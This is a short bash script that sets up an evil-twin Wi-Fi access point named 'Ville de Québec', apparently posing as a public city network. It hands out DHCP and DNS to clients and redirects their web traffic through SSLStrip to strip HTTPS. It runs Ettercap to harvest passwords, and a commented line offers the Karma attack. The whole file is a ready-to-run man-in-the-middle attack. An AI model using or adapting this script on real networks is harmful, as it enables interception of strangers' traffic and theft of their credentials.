#!/bin/bash

# apt-get install -y hostapd dnsmasq wireless-tools iw wvdial

# sed -i 's/^DAEMON_CONF=.*/DAEMON_CONF=\/etc\/hostapd\/hostapd.conf/' /etc/default/hostapd

# Stop every services which might cause any trouble with the wireless card
airmon-ng check kill

# DNSMasq config
cat <<EOF > /etc/dnsmasq.conf
log-facility=/var/log/dnsmasq.log
#address=/#/10.0.0.1
#address=/google.com/10.0.0.1
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
#no-resolv
log-queries
EOF

# Start dnsmasq through systemctl service 
service dnsmasq start

ifconfig wlan0 up
ifconfig wlan0 10.0.0.1/24

iptables -t nat -F
iptables -F
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# Redirect every tcp paquet on port 80 to SSLStrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Allow IPv4 fowarding
echo '1' > /proc/sys/net/ipv4/ip_forward

# Configuration HostPad
cat <<EOF > /etc/hostapd/hostapd.conf
interface=wlan0
driver=nl80211
ssid=Ville de Québec
channel=1
# Yes, we support the Karma attack.
#enable_karma=1
EOF

# Start hostpad through systemctl service
service hostapd start dsqf

# Start SSLStrip
gnome-terminal --tab -- sslstrip -l 10000

# Start Ettercap
gnome-terminal --tab -- ettercap -p -u -T -q -i wlan0